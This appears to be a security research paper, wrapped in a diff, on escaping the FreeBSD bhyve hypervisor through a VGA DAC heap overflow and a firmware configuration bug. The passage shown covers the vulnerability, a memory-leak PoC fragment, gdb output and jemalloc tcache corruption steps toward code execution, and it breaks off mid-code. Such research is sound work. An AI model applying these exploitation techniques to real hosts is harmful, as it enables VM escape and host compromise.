@@ -1,0 +1,3170 @@
+|=-----------------------------------------------------------------------=|
+|=----=[ Tale of two hypervisor bugs - Escaping from FreeBSD bhyve ]=----=|
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[  Reno Robert ]=---------------------------=|
+|=--------------------------=[ @renorobertr ]=---------------------------=|
+|=-----------------------------------------------------------------------=|
+                                                                           
+
+--[ Table of contents
+
+1 - Introduction
+2 - Vulnerability in VGA emulation
+3 - Exploitation of VGA bug
+      3.1 - Analysis of memory allocations in heap
+      3.2 - ACPI shutdown and event handling
+      3.3 - Corrupting tcache_s structure
+      3.4 - Discovering base address of guest memory
+      3.5 - Out of bound write to write pointer anywhere using unlink
+      3.6 - MMIO emulation and RIP control methodology
+      3.7 - Faking arena_chunk_s structure for arbitrary free
+      3.8 - Code execution using MMIO vCPU cache
+4 - Other exploitation strategies
+      4.1 - Allocating a region into another size class for free()
+      4.2 - PMIO emulation and corrupting inout_handlers structures
+      4.3 - Leaking vmctx structure
+      4.4 - Overwriting MMIO Red-Black tree node for RIP control
+      4.5 - Using PCI BAR decoding for RIP control
+5 - Notes on ROP payload and process continuation
+6 - Vulnerability in Firmware Configuration device
+7 - Exploitation of fwctl bug
+      7.1 - Analysis of memory layout in bss segment
+      7.2 - Out of bound write to full process r/w
+8 - Sandbox escape using PCI passthrough
+9 - Analysis of CFI and SafeStack in HardenedBSD 12-CURRENT
+      9.1 - SafeStack bypass using neglected pointers
+      9.2 - Registering arbitrary signal handler using ACPI shutdown
+10 - Conclusion
+11 - References
+12 - Source code and environment details 
+
+--[ 1 - Introduction
+
+VM escape has become a popular topic of discussion over the last few years.
+A good amount of research on this topic has been published for various
+hypervisors like VMware, QEMU, VirtualBox, Xen and Hyper-V. Bhyve is a
+hypervisor for FreeBSD supporting hardware-assisted virtualization. This
+paper details the exploitation of two bugs in bhyve -
+FreeBSD-SA-16:32.bhyve [1] (VGA emulation heap overflow) and CVE-2018-17160
+[21] (Firmware Configuration device bss buffer overflow) and some generic
+techniques which could be used for exploiting other bhyve bugs. Further,
+the paper also discusses sandbox escapes using PCI device passthrough, and
+Control-Flow Integrity bypasses in HardenedBSD 12-CURRENT
+
+--[ 2 - Vulnerability in VGA emulation
+
+FreeBSD disclosed a bug in VGA device emulation FreeBSD-SA-16:32.bhyve [1]
+found by Ilja van Sprundel, which allows a guest to execute code in the
+host. The bug affects virtual machines configured with 'fbuf' framebuffer
+device. The below patch fixed the issue:
+
+	struct {
+ 		uint8_t		dac_state;
+-		int		dac_rd_index;
+-		int		dac_rd_subindex;
+-		int		dac_wr_index;
+-		int		dac_wr_subindex;
++		uint8_t		dac_rd_index;
++		uint8_t		dac_rd_subindex;
++		uint8_t		dac_wr_index;
++		uint8_t		dac_wr_subindex;
+ 		uint8_t		dac_palette[3 * 256];
+ 		uint32_t	dac_palette_rgb[256];
+ 	} vga_dac;
+
+The VGA device emulation in bhyve uses 32-bit signed integer as DAC Address
+Write Mode Register and DAC Address Read Mode Register. These registers are
+used to access the palette RAM, having 256 entries of intensities for each
+value of red, green and blue. Data in palette RAM can be read or written by
+accessing DAC Data Register [2][3].
+
+After three successful I/O access to red, green and blue intensity values,
+DAC Address Write Mode Register or DAC Address Read Mode Register is
+incremented automatically based on the operation performed. Here is the
+issue, the values of DAC Address Read Mode Register and DAC Address Write
+Mode Register does not wrap under index of 256 since the data type is not
+'uint8_t', allowing an untrusted guest to read or write past the palette
+RAM into adjacent heap memory.
+
+The out of bound read can be achieved in function vga_port_in_handler() of
+vga.c file:
+
+case DAC_DATA_PORT:
+        *val = sc->vga_dac.dac_palette[3 * sc->vga_dac.dac_rd_index +
+        sc->vga_dac.dac_rd_subindex];
+        sc->vga_dac.dac_rd_subindex++;
+        if (sc->vga_dac.dac_rd_subindex == 3) {
+                sc->vga_dac.dac_rd_index++;
+                sc->vga_dac.dac_rd_subindex = 0;
+        }
+
+The out of bound write can be achieved in function vga_port_out_handler()
+of vga.c file:
+
+case DAC_DATA_PORT:
+        sc->vga_dac.dac_palette[3 * sc->vga_dac.dac_wr_index +
+sc->vga_dac.dac_wr_subindex] = val;
+        sc->vga_dac.dac_wr_subindex++;
+        if (sc->vga_dac.dac_wr_subindex == 3) {
+                sc->vga_dac.dac_palette_rgb[sc->vga_dac.dac_wr_index] =
+                . . . 
+                . . . 
+                sc->vga_dac.dac_wr_index++;
+                sc->vga_dac.dac_wr_subindex = 0;
+         }
+
+The vulnerability provides very powerful primitives - both read and write
+access to heap memory of the hypervisor user space process. The only issue
+is, after writing to dac_palette, the RGB value is encoded and written to
+the adjacent dac_palette_rgb array as a single value. This corruption can
+be corrected during the subsequent writes to dac_palette array since
+dac_palette_rgb is placed next to dac_palette during the linear write. But
+if the corrupted memory is used before correction, the bhyve process could
+crash. Such an issue was not faced during the development of exploit under
+FreeBSD 11.0-RELEASE-p1 r306420
+
+--[ 3 - Exploitation of VGA bug
+
+Though FreeBSD does not have ASLR, it is necessary to understand the
+process memory layout, the guest features which allow allocation and
+deallocation of heap memory in the host process and the ideal structures to
+corrupt for gaining reliable exploit primitives. This section provides an
+in-depth analysis of the exploitation of heap overflow to achieve arbitrary
+code execution in the host.
+
+----[ 3.1 - Analysis of memory allocations in heap
+
+FreeBSD uses jemalloc allocator for dynamic memory management. Research
+done by huku, argp and vats on jemalloc [4][5][6], provides great insights
+into the allocator. Understanding the details provided in paper
+Pseudomonarchia jemallocum [4] is essential for following many parts of
+section 3. The jemalloc used in FreeBSD 11.0-RELEASE-p1 is slightly
+different from the one described in papers [4][5], however, the core design
+and exploitation techniques remain the same.
+
+The user space bhyve process is multi-threaded, and hence multiple thread
+caches are used by jemalloc. The threads of prime importance for this study
+are 'mevent' and 'vcpu N', where N is the vCPU number. 'mevent' thread is
+the main thread which does all the initialization as part of main()
+function in bhyverun.c file:
+
+int 
+main (int argc, char *argv[])
+{
+        memsize = 256 * MB;
+        . . .
+        case 'm':
+                error = vm_parse_memsize(optarg, &memsize);	
+        . . .
+        vm_set_memflags(ctx, memflags);
+        err = vm_setup_memory(ctx, memsize, VM_MMAP_ALL);	
+        . . . 
+        if (init_pci(ctx) != 0)					
+        . . .
+        fbsdrun_addcpu(ctx, BSP, BSP, rip);	
+        . . .
+        mevent_dispatch();	
+        . . .
+}
+
+The first allocation of importance is the guest physical memory, mapped
+into the address space of the bhyve process. A preconfigured memory of
+256MB is allocated to any virtual machine. A VM can also be configured with
+more memory using '-m' parameter. The guest physical memory map along with
+the system memory looks like below (found in pci_emul.c):
+
+/*
+ * The guest physical memory map looks like the following:
+ * [0,		    lowmem)		guest system memory
+ * [lowmem,	    lowmem_limit)	memory hole (may be absent)
+ * [lowmem_limit,   0xE0000000)		PCI hole (32-bit BAR
+ * allocation)
+ * [0xE0000000,	    0xF0000000)		PCI extended config window
+ * [0xF0000000,	    4GB)		LAPIC, IOAPIC, HPET,
+ * firmware
+ * [4GB,	    4GB + highmem)
+ */
+
+Here the lowmem_limit can be a maximum value up to 3GB. Guest system memory
+is mapped into the bhyve process by calling mmap(). Along with the
+requested size of guest system memory, 4MB (VM_MMAP_GUARD_SIZE) guard pages
+are allocated before and after the virtual address space of the guest
+system memory. The vm_setup_memory() API in lib/libvmmapi/vmmapi.c performs
+the mentioned operation as below:
+
+int
+vm_setup_memory(struct vmctx *ctx, size_t memsize, enum vm_mmap_style vms)
+{
+        . . .
+        /*
+          * If 'memsize' cannot fit entirely in the 'lowmem' segment then
+          * create another 'highmem' segment above 4GB for the remainder.
+          */
+        if (memsize > ctx->lowmem_limit) {
+                ctx->lowmem = ctx->lowmem_limit;
+                ctx->highmem = memsize - ctx->lowmem_limit;
+                objsize = 4*GB + ctx->highmem;
+        } else {
+                ctx->lowmem = memsize;
+                ctx->highmem = 0;
+                objsize = ctx->lowmem;
+        }
+
+        /*
+          * Stake out a contiguous region covering the guest physical
+          * memory
+          * and the adjoining guard regions.
+          */
+        len = VM_MMAP_GUARD_SIZE + objsize + VM_MMAP_GUARD_SIZE; 	
+        flags = MAP_PRIVATE | MAP_ANON | MAP_NOCORE | MAP_ALIGNED_SUPER;
+        ptr = mmap(NULL, len, PROT_NONE, flags, -1, 0);
+        . . .
+        baseaddr = ptr + VM_MMAP_GUARD_SIZE;
+        . . .
+        ctx->baseaddr = baseaddr;
+        . . .
+}
+
+Once the contiguous allocation for guest physical memory is made, the pages
+are later marked as PROT_READ | PROT_WRITE and mapped into the guest
+address space. The 'baseaddr' is the virtual address of guest physical
+memory. 
+
+The next interesting allocation is made during the initialization of
+virtual PCI devices. The init_pci() call in main() initializes all the
+device emulation code including the framebuffer device. The framebuffer
+device performs initialization of the VGA structure 'vga_softc' in vga.c
+file as below:
+
+void *
+vga_init(int io_only)
+{
+        struct inout_port iop;
+        struct vga_softc *sc;
+        int port, error;
+
+        sc = calloc(1, sizeof(struct vga_softc));
+        . . .
+}
+
+struct vga_softc {
+        struct mem_range        mr;
+        . . .
+        struct {
+                uint8_t.       dac_state;
+                int             	  dac_rd_index;
+                int                 dac_rd_subindex;
+                int                 dac_wr_index;
+                int                 dac_wr_subindex;
+                uint8_t         dac_palette[3 * 256];
+                uint32_t       dac_palette_rgb[256];
+        } vga_dac;
+};
+
+The 'vga_softc' structure (2024 bytes) where the overflow happens is
+allocated as part of tcache bin, servicing regions of size 2048 bytes. The
+framebuffer device also performs a few allocations as part of the remote
+framebuffer server, however, these are not significant for the exploitation
+of the bug. 
+
+Next, let's analyze the memory between vga_softc structure and the guest
+physical memory guard page to identify any interesting structures to
+corrupt or leak. Since the out of bounds read/write is linear, guest can
+only leak information until the guard page for now. The file readmemory.c
+in the attached code reads the bhyve heap memory from an Ubuntu 14.04.5 LTS
+guest operating system.
+
+---[ readmemory.c ]---
+           
+. . .
+        iopl(3);
+
+        warnx("[+] Reading bhyve process memory...");
+        chunk_lw_size = getpagesize() * PAGES_TO_READ;
+        chunk_lw = calloc(chunk_lw_size, sizeof(uint8_t));
+
+        outb(0, DAC_IDX_RD_PORT);
+        for (int i = 0; i < chunk_lw_size; i++) {
+                chunk_lw[i] = inb(DAC_DATA_PORT);
+        }
+
+        for (int index = 0; index < chunk_lw_size/8; index++) {
+                qword = ((uint64_t *)chunk_lw)[index];
+                if (qword > 0) {
+                        warnx("[%06d] => 0x%lx", index, qword);
+                }
+        }
+. . .
+
+Running the code in the guest leaks a bunch of heap pointers as below:
+
+root@linuxguest:~/setupA/readmemory# ./readmemory
+. . .
+readmemory: [128483] => 0x801b6f000
+readmemory: [128484] => 0x801b6f000
+readmemory: [128486] => 0xe4000000b5
+readmemory: [128489] => 0x100000000
+readmemory: [128491] => 0x801b6fb88
+readmemory: [128493] => 0x100000000
+readmemory: [128495] => 0x801b701c8
+readmemory: [128497] => 0x100000000
+readmemory: [128499] => 0x801b70808
+readmemory: [128501] => 0x100000000
+readmemory: [128503] => 0x801b70e48
+. . .
+
+After some analysis, it is realized that this is tcache_s structure used by
+jemalloc. Inspecting the memory with gdb provides further details:
+
+(gdb) info threads 
+  Id   Target Id         Frame 
+* 1    LWP 100185 of process 4891 "mevent" 0x000000080121198a in _kevent ()
+* from /lib/libc.so.7
+. . .
+  12   LWP 100198 of process 4891 "vcpu 0" 0x00000008012297da in ioctl ()
+from /lib/libc.so.7
+
+(gdb) thread 12
+[Switching to thread 12 (LWP 100198 of process 4891)]
+#0  0x00000008012297da in ioctl () from /lib/libc.so.7
+
+(gdb) print *((struct tsd_s *)($fs_base-160))
+$21 = {state = tsd_state_nominal, tcache = 0x801b6f000, thread_allocated =
+2720, thread_deallocated = 2464, prof_tdata = 0x0, iarena = 0x801912540,
+arena = 0x801912540, 
+  arenas_tdata = 0x801a1b040, narenas_tdata = 8, arenas_tdata_bypass =
+false, tcache_enabled = tcache_enabled_true, __je_quarantine = 0x0,
+witnesses = {qlh_first = 0x0}, 
+  witness_fork = false}
+
+For any thread, the thread-specific data is located at an address pointed
+by $fs_base-160. The tcache address can be found by inspecting 'tsd_s'
+structure. The 'vcpu 0' thread's tcache structure is the one that the guest
+could access using the VGA bug. This can be confirmed by gdb:
+
+(gdb) print *(struct tcache_s *)0x801b6f000
+$1 = {link = {qre_next = 0x801b6f000, qre_prev = 0x801b6f000},
+prof_accumbytes = 0, gc_ticker = {tick = 181, nticks = 228}, next_gc_bin =
+0, tbins = {{tstats = {nrequests = 0}, 
+      low_water = 0, lg_fill_div = 1, ncached = 0, avail = 0x801b6fb88}}}
+
+Since tcache structure is accessible, the tcache metadata can be corrupted
+as detailed in [4] for further exploitation. The heap layout was further
+analyzed under multiple CPU configurations as below:
+
+- Guest with single vCPU and host with single CPU
+- Guest with single vCPU and host with more than one CPU core
+- Guest with more than one vCPU and host with more than one CPU core
+
+Some of the observed changes are
+- The number of jemalloc arenas is 4 times the number of CPU core
+  available. When the number of CPU core changes, the heap layout also
+  changes marginally. I say marginally because tcache structure can still
+  be reached from the 'vga_softc' structure during the overflow
+- When there is more than one vCPU, each vCPU thread has its own thread
+  caches (tcache_s). The thread caches of vCPU's are placed one after the
+  other.
+
+The thread cache structures of vCPU threads are allocated in the same chunk
+as that of vga_softc structure managed by arena[0]. During a linear
+overflow, the first tcache_s structure to get corrupted is that of vCPU0.
+Since vCPU0 is always available under any configuration, it is a reliable
+target to corrupt. The CPU affinity of exploit running in the guest should
+be set to vCPU0 to ensure corrupted structures are used during the
+execution of the exploit. To summarize, the heap layout looks like below:
+
++-----------------------------------------------------+-------+---------+
+|                                                     |       |         |
+| +---------+  +--------+   +--------+     +--------+ |       |         |
+| |vga_softc|  |tcache_s|   |tcache_s|.....|tcache_s| | Guard |  Guest  |
+| |         |  | vCPU0  |   | vCPU1  |     | vCPUX  | | Page  |  Memory |
+| +---------+  +--------+   +--------+     +--------+ |       |         |
+|                                                     |       |         |
++-----------------------------------------------------+-------+---------+
+
+This memory layout is expected to be consistent for a couple of reasons.
+First, the jemalloc chunk of size 2MB is mapped by the allocator when bhyve
+makes its first allocation request during _libpthread_init() ->
+_thr_alloc() -> calloc(). This further goes through a series of calls
+tcache_create() -> ipallocztm() -> arena_palloc() -> arena_malloc() ->
+arena_malloc_large() -> arena_run_alloc_large() -> arena_chunk_alloc() ->
+chunk_alloc_core() -> chunk_alloc_mmap() -> pages_map() -> mmap() (some of
+the functions are skipped and library-private functions will have a prefix
+__je_ to their function names). The guest memory mapped using
+vm_setup_memory() during bhyve initialization will occupy the memory region
+right after this jemalloc chunk due to the predictable mmap() behaviour.
+Second, the 'vga_softc' structure will occupy a lower memory address in the
+chunk compared to that of 'tcache_s' structures because jemalloc allocates
+'tcache_s' structures using tcache_create() (serviced as large allocation
+request of 32KB in this case) only when the vCPU threads make an allocation
+request. Allocation of 'vga_softc' structure happens much earlier in the
+initialization routine compared to the creation of vCPU threads by
+fbsdrun_addcpu().  
+
+----[ 3.2 - ACPI shutdown and event handling
+
+Next task is to find a feature which allows the guest to trigger an
+allocation or deallocation after corrupting the tcache metadata. Inspecting
+each of the bins, an interesting allocation was found in tbins[4]:
+
+(gdb) print ((struct tcache_s *)0x801b6f000)->tbins[4]
+$2 = {tstats = {nrequests = 1}, low_water = -1, lg_fill_div = 1, ncached =
+63, avail = 0x801b71248}
+
+(gdb) x/gx 0x801b71248-64*8
+0x801b71048:	0x0000000813c10000
+
+(gdb) x/5gx 0x0000000813c10000
+0x813c10000:	0x0000000000430380	0x000000000000000f
+0x813c10010:	0x0000000000000003	0x0000000801a15080
+0x813c10020:	0x0000000100000000
+
+(gdb) x/i 0x0000000000430380
+   0x430380 <power_button_handler>:	push   %rbp
+
+ (gdb) print *(struct mevent *)0x0000000813c10000
+$3 = {me_func = 0x430380 <power_button_handler>, me_fd = 15, me_timid = 0,
+me_type = EVF_SIGNAL, me_param = 0x801a15080, me_cq = 0, me_state = 1,
+me_closefd = 0, me_list = {
+    le_next = 0x801a15100, le_prev = 0x801a15430}}
+
+bhyve emulates access to I/O port 0xB2 (Advanced Power Management Control
+port) to enable and disable ACPI virtual power button. A handler for
+SIGTERM signal is registered through FreeBSD's kqueue mechanism [7]. 
+
+'mevent' is a micro event library based on kqueue for bhyve found in
+mevent.c. The library exposes a set of API for registering and modifying
+events. The main 'mevent' thread handles all the events. The
+mevent_dispatch() function called from main() dispatches to the respective
+event handlers when an event is reported. The two notable API's of interest
+for the exploitation of this bug are mevent_add() and mevent_delete().
+Let's see how the 0xB2 I/O port handler in pm.c uses the mevent library:
+
+static int
+smi_cmd_handler(struct vmctx *ctx, int vcpu, int in, int port, int bytes,
+    uint32_t *eax, void *arg)
+{
+        . . .
+        switch (*eax) {
+        case BHYVE_ACPI_ENABLE:
+                . . .                
+                if (power_button == NULL) {
+                        power_button = mevent_add(SIGTERM, EVF_SIGNAL,
+                            power_button_handler, ctx);
+                        old_power_handler = signal(SIGTERM, SIG_IGN);
+                }
+                break;
+        case BHYVE_ACPI_DISABLE:
+                . . .
+                if (power_button != NULL) {
+                        mevent_delete(power_button);
+                        power_button = NULL;
+                        signal(SIGTERM, old_power_handler);
+                }
+                break;
+        }
+        . . .
+}
+
+Writing the value 0xa0 (BHYVE_ACPI_ENABLE) will trigger a call to
+mevent_add() in mevent.c. mevent_add() function allocates a mevent
+structure using calloc(). The events that require addition, update or
+deletion are maintained in a list pointed by the list head 'change_head'.
+The elements in the list are doubly linked.
+
+struct mevent *
+mevent_add(int tfd, enum ev_type type,
+           void (*func)(int, enum ev_type, void *), void *param)
+{
+        . . .
+        mevp = calloc(1, sizeof(struct mevent));
+        . . .
+        mevp->me_func = func;
+        mevp->me_param = param;
+
+        LIST_INSERT_HEAD(&change_head, mevp, me_list);
+        . . .
+}
+
+struct mevent {	
+        void	(*me_func)(int, enum ev_type, void *);
+        . . .
+        LIST_ENTRY(mevent) me_list;			   
+};
+
+#define	LIST_ENTRY(type)					\
+struct {							\
+        struct type *le_next;	/* next element */			\
+        struct type **le_prev;	/* address of previous next element */	\
+}
+
+Similarly, writing a value 0xa1 (BHYVE_ACPI_DISABLE) will trigger a call to
+mevent_delete() in mevent.c. mevent_delete() unlinks the event from the
+list using LIST_REMOVE() and marks it for deletion by mevent thread:
+
+static int
+mevent_delete_event(struct mevent *evp, int closefd)
+{
+        . . .
+                LIST_REMOVE(evp, me_list);
+        . . .
+}
+
+#define LIST_NEXT(elm, field)	((elm)->field.le_next)
+#define LIST_REMOVE(elm, field) do {                                     \
+        . . .
+        if (LIST_NEXT((elm), field) != NULL)                           	\
+                LIST_NEXT((elm), field)->field.le_prev =
+\
+                    (elm)->field.le_prev;
+\
+        *(elm)->field.le_prev = LIST_NEXT((elm), field);               \
+        . . .
+} while (0)
+
+To summarize, guest can allocate and deallocate a mevent structure having
+function and list pointers. The allocation requests are serviced by thread
+cache of vCPU threads. CPU affinity could be set for the exploit code, to
+force allocations from a vCPU thread of choice. i.e. vCPU0 as seen in the
+previous section. Corrupting the 'tcache_s' structure of vCPU0, would allow
+us to control where the mevent structure gets allocated.
+
+----[ 3.3 - Corrupting tcache_s structure
+
+'tcache_s' structure has an array of tcache_bin_s structures. tcache_bin_s
+has a pointer (void **avail) to an array of pointers to pre-allocated
+memory regions, which services allocation requests of a fixed size.
+
+typedef struct tcache_s tcache_t;
+
+struct tcache_s {
+    struct {
+        tcache_t *qre_next;
+        tcache_t *qre_prev;
+    } link;
+    uint64_t prof_accumbytes;
+    ticker_t gc_ticker;
+    szind_t next_gc_bin;
+    tcache_bin_t tbins[1];
+}
+
+struct tcache_bin_s {
+    tcache_bin_stats_t tstats;
+    int low_water;
+    unsigned int lg_fill_div;
+    unsigned int ncached;
+    void **avail;
+}
+
+As seen in section 2.1.7 and 3.3.3 of paper Pseudomonarchia jemallocum [4]
+and [6], it is possible to return an arbitrary address during allocation by
+corrupting thread caches. 'ncached' is the number of cached free memory
+regions available for allocation. When an allocation is requested, it is
+fetched as avail[-ncached] and 'ncached' gets decremented. Likewise, when
+an allocation is freed, 'ncached' gets incremented, and the pointer is
+added to the free list as avail[-ncached] = ptr. The allocation requests
+for 'mevent' structure with size 0x40 bytes is serviced by tbin[4].avail
+pointers. The 'vga_softc' out of bound read can first leak the heap memory
+including the 'tcache_s' structure. Then the out of bound write can be used
+to overwrite the pointers to free memory regions pointed by 'avail'. By
+leaking and rewriting memory, we make sure parts of memory other than
+thread caches are not corrupted. To be specific, it is only needed to
+overwrite tbins[4].avail[-ncached] pointer before invoking mevent_add(). On
+a side note, the event marked for deletion by mevent_delete() is freed by
+mevent thread and not by vCPU0 thread. Hence the freed pointer never makes
+into tbins[4].avail array of vCPU0 thread cache but becomes available in
+mevent thread cache. 
+
+When calloc() request is made to allocate mevent structure in mevent_add(),
+it uses the overwritten pointers of tcache_s structure. This forces the
+mevent structure to be allocated at the arbitrary guest-controlled address.
+Though the mevent structure can be allocated at an arbitrary address, we do
+not have control over the contents written to it to turn this into a
+write-anything-anywhere. 
+
+In order to modify the contents of mevent structure, one solution is to
+allocate the structure into the guest system memory, mapped in the bhyve
+process. Since this memory is accessible to the guest, the contents can be
+directly modified from within the guest. The other solution is to allocate
+the structure adjacent to the 'vga_softc' structure, use the out of bound
+write again, to modify the content. The later technique will be discussed
+in section 4.
+
+The current approach to determine the 'tcache_s' structure in the leaked
+memory is a signature-based search using 'tcache_s' definition implemented
+as find_jemalloc_tcache() in the PoC. It is observed that the link pointers
+'qre_next' and 'qre_prev' are page-aligned since 'tcache_s' allocations are
+page-aligned. Moreover, there are other valid pointers such as
+tbins[index].avail, which can be used as signatures. When a possible
+'tcache_s' structure is located in memory, the tbins[4].avail pointer is
+fetched for further analysis. Next part of this approach is to locate the
+array of pointers in memory which tbins[4].avail points to, by searching
+for a sequence of values varying by 0x40 (mevent allocation size). Once the
+offset to avail pointer array from 'vga_softc' structure is known, we can
+precisely overwrite tbin[4].avail[-ncached] to return an arbitrary address.
+The 'vga_softc' address can be roughly calculated as tbins[4].avail -
+(number of entries in avail * sizeof(void *)) - offset to avail array from
+'vga_softc' structure. tcache_create() function in tcache.c gives a clear
+understanding of tcache_s allocation and avail pointer assignment:
+
+tcache_t *
+tcache_create(tsdn_t *tsdn, arena_t *arena)
+{
+        . . .
+	size = offsetof(tcache_t, tbins) + (sizeof(tcache_bin_t) * nhbins);
+	/* Naturally align the pointer stacks. */
+        size = PTR_CEILING(size);
+        stack_offset = size;
+        size += stack_nelms * sizeof(void *);
+        /* Avoid false cacheline sharing. */
+        size = sa2u(size, CACHELINE);
+
+        tcache = ipallocztm(tsdn, size, CACHELINE, true, NULL, true,
+            arena_get(TSDN_NULL, 0, true));
+        . . .
+        for (i = 0; i < nhbins; i++) {
+                tcache->tbins[i].lg_fill_div = 1;
+		stack_offset += tcache_bin_info[i].ncached_max *
+					sizeof(void *);
+                /*
+		 * avail points past the available space.  Allocations will
+		 * access the slots toward higher addresses (for the
+		 * benefit of prefetch).
+                 */
+		tcache->tbins[i].avail = (void **)((uintptr_t)tcache +
+				(uintptr_t)stack_offset);
+        }
+
+        return (tcache);
+}
+
+The techniques to locate 'tcache_s' structure has lot more scope for
+improvement and further study in terms of the signature used or leaking
+'tcache_s' base address directly from link pointers when qre_next ==
+qre_prev
+
+----[ 3.4 - Discovering base address of guest memory
+
+Leaking the 'baseaddr' allows the guest to set up shared memory between the
+guest and the host bhyve process. By knowing the guest physical address of
+a memory allocation, the host virtual address of the guest allocation can
+be calculated as 'baseaddr' + guest physical address. Fake data structures
+or payloads could be injected into the bhyve process memory using this
+shared memory from the guest [8].
+
+Due to the memory layout observed in section 3.1, if we can leak at least
+one pointer within the jemalloc chunk before guest memory pages (which is
+the case here), the base address of chunk can be calculated. Jemalloc in
+FreeBSD 11.0 uses chunks of size 2 MB, aligned to its size.
+CHUNK_ADDR2BASE() macro in jemalloc calculates the base address of a chunk,
+given any pointer in a chunk as below:
+
+#define CHUNK_ADDR2BASE(a)                                              \
+                ((void *)((uintptr_t)(a) & ~chunksize_mask))
+
+where chunksize_mask is '(chunksize - 1)' and 'chunksize' is 2MB. Once the
+chunk base address is known, the base address of guest memory can be
+calculated as chunk base address + chunk size + VM_MMAP_GUARD_SIZE (4MB)
+
+Another way to get the base address is by leaking the 'vmctx' structure
+from lower memory of chunk. This will be discussed as part of section 4.3.
+
+----[ 3.5 - Out of bound write to write pointer anywhere using unlink
+
+Once the guest allocates the mevent structure within its system memory, it
+can overwrite the 'power_button_handler' callback and wait until the host
+turns off the VM. SIGTERM signal will be delivered to the bhyve process
+during poweroff, which in turn triggers the overwritten handler, giving RIP
+control. However, this approach has a drawback - the guest needs to wait
+until the VM is powered off from the host.
+
+To eliminate this host interaction, the next idea is to use the list
+unlink. By corrupting the previous and next pointers of the list, we can
+write an arbitrary value to an arbitrary address using LIST_REMOVE() in
+mevent_delete_event() (section 3.2). The major limitation of this approach
+is that the value written should also be a writable address. Hence function
+pointers cannot be directly overwritten.
+
+With the ability to write a writable address to arbitrary address, the next
+step is to find a target to overwrite to control RIP indirectly.
+
+----[ 3.6 - MMIO emulation and RIP control methodology
+
+The PCI hole memory region of guest memory (section 3.1) is not mapped and
+is used for device emulation. Any access to this memory will trigger an
+Extended Page Table (EPT) fault resulting in VM-exit. The
+vmx_exit_process() in the VMM code src/sys/amd64/vmm/intel/vmx.c invokes
+the respective handler based on the VM-exit reason.
+
+static int
+vmx_exit_process(struct vmx *vmx, int vcpu, struct vm_exit *vmexit)
+{
+        . . .
+        case EXIT_REASON_EPT_FAULT:
+                /*
+                 * If 'gpa' lies within the address space allocated to
+                 * memory then this must be a nested page fault otherwise
+                 * this must be an instruction that accesses MMIO space.
+                 */
+                gpa = vmcs_gpa();
+                if (vm_mem_allocated(vmx->vm, vcpu, gpa) ||
+                    apic_access_fault(vmx, vcpu, gpa)) {
+                        vmexit->exitcode = VM_EXITCODE_PAGING;
+                        . . .
+                } else if (ept_emulation_fault(qual)) {
+                        vmexit_inst_emul(vmexit, gpa, vmcs_gla());
+                        vmm_stat_incr(vmx->vm, vcpu, VMEXIT_INST_EMUL, 1);
+                }
+        . . .
+}
+
+vmexit_inst_emul() sets the exit code to 'VM_EXITCODE_INST_EMUL' and other
+exit details for further emulation. The VM_RUN ioctl used to run the
+virtual machine then calls vm_handle_inst_emul() in sys/amd64/vmm/vmm.c, to
+check if the Guest Physical Address (GPA) accessed is emulated in-kernel.
+If not, the exit information is passed on to the user space for emulation.
+
+int
+vm_run(struct vm *vm, struct vm_run *vmrun)
+{
+        . . .
+                case VM_EXITCODE_INST_EMUL:
+                        error = vm_handle_inst_emul(vm, vcpuid, &retu);
+                        break;
+        . . .
+}
+
+MMIO emulation in the user space is done by the vmexit handler
+vmexit_inst_emul() in bhyverun.c. vm_loop() dispatches execution to the
+respective handler based on the exit code.
+
+static void
+vm_loop(struct vmctx *ctx, int vcpu, uint64_t startrip)
+{
+        . . .
+                error = vm_run(ctx, vcpu, &vmexit[vcpu]);
+        . . .
+                exitcode = vmexit[vcpu].exitcode;
+        . . .
+                rc = (*handler[exitcode])(ctx, &vmexit[vcpu], &vcpu);
+}
+
+static vmexit_handler_t handler[VM_EXITCODE_MAX] = {
+        . . .
+        [VM_EXITCODE_INST_EMUL] = vmexit_inst_emul,
+        . . .
+};
+
+The user space device emulation is interesting for this exploit because it
+has the right data structures to corrupt using the list unlink. The memory
+ranges and callbacks for each user space device emulation is stored in a
+red-black tree. When a PCI BAR is programmed to map a MMIO region using
+register_mem() or when a memory region is registered explicitly through
+register_mem_fallback() in mem.c, the information is added to mmio_rb_root
+and mmio_rb_fallback RB trees respectively. During an instruction
+emulation, the red-black trees are traversed to find the node which has the
+handler for the guest physical address which caused the EPT fault. The
+red-black tree nodes are defined by the structure 'mmio_rb_range' in mem.c
+
+struct mmio_rb_range {
+        RB_ENTRY(mmio_rb_range) mr_link;        /* RB tree links */
+        struct mem_range        mr_param;
+        uint64_t                mr_base;
+        uint64_t                mr_end;
+};
+
+The 'mr_base' element is the starting address of a memory range, and
+'mr_end' marks the ending address of the memory range. The 'mem_range'
+structure is defined in mem.h, has the pointer to the handler and arguments
+'arg1' and 'arg2' along with 6 other arguments.
+
+typedef int (*mem_func_t)(struct vmctx *ctx, int vcpu, int dir, uint64_t
+addr,
+                          int size, uint64_t *val, void *arg1, long arg2);
+
+struct mem_range {
+        const char      *name;
+        int             flags;
+        mem_func_t      handler;
+        void            *arg1;
+        long            arg2;
+        uint64_t        base;
+        uint64_t        size;
+};
+
+To avoid red-black tree lookup each time when there is an instruction
+emulation, a per-vCPU MMIO cache is used. Since most accesses from a vCPU
+will be to a consecutive address in a device memory range, the result of
+the red-black tree lookup is maintained in an array 'mmio_hint'. When
+emulate_mem() is called by vmexit_inst_emul(), first the MMIO cache is
+looked up to see if there is an entry. If yes, the guest physical address
+is checked against 'mr_base' and 'mr_end' value to validate the cache
+entry. If it is not the expected entry, it is a cache miss. Then the
+red-black tree is traversed to find the correct entry. Once the entry is
+found, vmm_emulate_instruction() in sys/amd64/vmm/vmm_instruction_emul.c
+(common code for user space and the VMM) is called for further emulation.
+
+static struct mmio_rb_range	*mmio_hint[VM_MAXCPU];
+
+int
+emulate_mem(struct vmctx *ctx, int vcpu, uint64_t paddr, struct vie *vie,
+    struct vm_guest_paging *paging)
+
+{
+        . . .
+        if (mmio_hint[vcpu] &&
+            paddr >= mmio_hint[vcpu]->mr_base &&
+            paddr <= mmio_hint[vcpu]->mr_end) {
+                entry = mmio_hint[vcpu];
+        } else
+                entry = NULL;
+        if (entry == NULL) {
+                if (mmio_rb_lookup(&mmio_rb_root, paddr, &entry) == 0) {
+                        /* Update the per-vCPU cache */
+                        mmio_hint[vcpu] = entry;
+                } else if (mmio_rb_lookup(&mmio_rb_fallback, paddr,
+&entry)) {                        
+        . . .
+        err = vmm_emulate_instruction(ctx, vcpu, paddr, vie, paging,
